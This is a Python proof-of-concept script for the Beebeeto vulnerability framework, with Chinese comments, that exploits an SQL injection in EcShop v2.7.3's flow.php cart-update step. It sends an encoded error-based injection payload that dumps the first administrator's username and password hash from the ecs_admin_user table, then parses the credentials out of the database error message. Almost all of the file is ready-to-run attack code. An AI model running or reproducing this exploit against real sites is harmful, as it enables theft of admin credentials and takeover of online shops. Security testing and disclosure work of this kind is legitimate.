#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0037',           # 由Beebeeto官方编辑
            'name': 'EcShop v2.7.3 /flow.php SQL注入漏洞 EXP',  # 名称
            'author': 'Bug',                   # 作者
            'create_date': '2014-09-29',    # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ecshop',  # 漏洞所涉及的应用名称
            'vul_version': ['2.7.3'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['ecshop', 'SQL Injection', 'ecshop漏洞', '信息泄露漏洞'],  # 漏洞相关tag
            'desc': 'N/A',  # 漏洞描述
            'references': ['http://www.waitalone.cn/ec-shop-bulk-injection-exp.html'],  # 参考链接
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']+"/flow.php?step=update_cart"
        postDataExp = ("goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat"
                       "%28%28select+%28select+%28SELECT+concat%28user_name%2C0x7c%2Cpassword%29+"
                       "FROM+ecs_admin_user+limit+0%2C1%29%29+from+information_schema.tables+limit"
                       "+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+"
                       "group+by+x%29a%29+and+1%3D1+%23%5D=1&submit=exp")
        req = urllib2.Request(url = verify_url, data = postDataExp)
        response = urllib2.urlopen(req, timeout = 10)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = response.read()
        if content == None:
            args['success'] = False
            return args
        pattern = re.compile(r".*Duplicate\s*entry\s*'(?P<username>[\w]+)\|(?P<password>[\w]+)",re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("username")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())